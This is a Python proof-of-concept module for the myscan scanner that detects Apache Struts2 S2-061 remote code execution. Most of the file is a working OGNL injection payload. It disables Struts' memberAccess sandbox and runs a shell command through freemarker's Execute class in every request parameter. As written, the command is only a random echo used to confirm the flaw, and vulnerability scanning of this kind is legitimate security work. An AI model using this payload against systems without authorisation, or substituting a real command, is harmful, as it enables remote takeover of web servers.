# !/usr/bin/env python3
# @Time    : 2020/12/24
# @Author  : caicai
# @File    : myscan_struts2_061.py


from myscan.lib.core.common import get_random_str, check_echo
from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Struts2-061"
        self.vulmsg = "Struts2-061远程代码执行,link:https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g"
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.dictdata.get("url").get("extension").lower() not in ["do", "action", ""]:
            return
        self.parser = dictdata_parser(self.dictdata)
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        rs1 = get_random_str(4)
        rs2 = get_random_str(4)
        random_str = "{} {}".format(rs1, rs2)
        if params:
            for param in params:
                payload = '''%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("echo ''' + random_str + '''")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'''
                req = self.parser.getreqfromparam(param, "w", payload)
                r1 = request(**req)
                if r1 is not None and check_echo(r1.content, rs1, rs2):
                    parser_ = response_parser(r1)
                    self.result.append({
                        "name": self.name,
                        "url": parser_.geturl(),
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg,
                            "commond": "echo {}".format(random_str),
                            "request": parser_.getrequestraw(),
                            "response": parser_.getresponseraw(),
                        }
                    })
